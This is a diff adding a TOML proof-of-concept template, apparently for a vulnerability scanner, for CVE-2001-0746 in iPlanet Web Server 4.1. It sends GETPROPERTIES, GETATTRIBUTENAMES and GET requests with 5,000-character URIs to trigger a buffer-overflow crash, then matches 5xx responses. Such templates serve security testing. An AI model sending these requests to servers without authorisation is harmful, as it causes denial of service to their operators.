@@ -1,0 +1,101 @@
+[info]
+author = "ave"
+description = "iPlanet Web Server Enterprise Edition 4.1 Web Publisher 缓冲区溢出漏洞 PoC 验证。通过发送超长 URI 的 GETPROPERTIES/GETATTRIBUTENAMES 请求触发缓冲区溢出导致拒绝服务。"
+id = "POC-AVE-2001-0328"
+name = "CVE-2001-0746 PoC"
+severity = "critical"
+tags = ["ave-2001-0328"]
+vuln_id = [
+    "CVE-2001-0746",
+    "AVE-2001-0328",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GETPROPERTIES"
+path = "/{{repeat('A', 5000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "502",
+    "503",
+    "504",
+    "Internal Server Error",
+    "Service Unavailable",
+]
+
+[[poc.requests]]
+method = "GETATTRIBUTENAMES"
+path = "/{{repeat('A', 5000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "502",
+    "503",
+    "504",
+    "Internal Server Error",
+    "Service Unavailable",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{repeat('A', 5000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "502",
+    "503",
+    "504",
+    "Internal Server Error",
+    "Service Unavailable",
+]
